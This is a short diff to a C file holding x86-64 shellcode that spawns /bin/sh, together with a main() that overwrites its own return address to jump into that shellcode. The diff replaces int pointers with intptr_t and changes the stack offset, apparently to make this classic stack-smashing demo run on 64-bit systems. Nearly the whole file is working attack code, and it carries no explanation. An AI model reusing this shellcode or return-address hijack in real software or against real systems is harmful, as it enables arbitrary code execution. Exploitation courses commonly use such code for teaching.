@@ -1,3 +1,5 @@
+#include <stdint.h>
+
 char shellcode[] =
     "\xeb\x17"             // jmp    617 <push_string>
     "\x5f"                 // pop    %rdi
@@ -12,7 +14,7 @@ char shellcode[] =
     "/bin/sh";
 
 int main(void) {
-  int *ret;
-  ret = (int *) &ret + 4;
-  (*ret) = (int) shellcode;
+  intptr_t *ret;
+  ret = (intptr_t *) &ret + 2;
+  (*ret) = (intptr_t) shellcode;
 }
